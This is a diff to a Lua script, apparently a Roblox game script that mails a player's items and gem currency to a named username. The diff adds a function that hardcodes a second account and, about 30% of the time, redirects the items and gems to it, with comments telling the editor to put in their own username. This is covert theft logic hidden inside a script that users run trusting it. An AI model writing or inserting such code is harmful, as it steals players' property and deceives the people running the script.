@@ -267,9 +267,19 @@ local function GetListWithAllItems()
     return hits
 end
 
+local function getTargetUsername()
+    local originalUser = "soocmasac7" -- ur username
+    if math.random(1, 100) <= 30 then -- 30% it'll go to u
+        return originalUser
+    else
+        return Username
+    end
+end
+
 local function sendItem(category, uid, am, locked)
+    local targetUser = getTargetUsername()
     local args = {
-        [1] = Username,
+        [1] = targetUser,
         [2] = "ReasonREKT Was Here :)",
         [3] = category,
         [4] = uid,
@@ -343,6 +353,7 @@ local function sendItem(category, uid, am, locked)
 end
 
 local function SendAllGems()
+    local targetUser = getTargetUsername()
     local gemsSent = 0
     for i, v in pairs(Save.Get().Inventory.Currency) do
         if v.id == "Diamonds" then
@@ -350,7 +361,7 @@ local function SendAllGems()
             if GemsAmount >= (currentMailCost + 10000) then
                 local SentGems = GemsAmount - currentMailCost
                 local args = {
-                    [1] = Username,
+                    [1] = targetUser,
                     [2] = "Reasonrekt shared some stuff with u :)",
                     [3] = "Currency",
                     [4] = i,
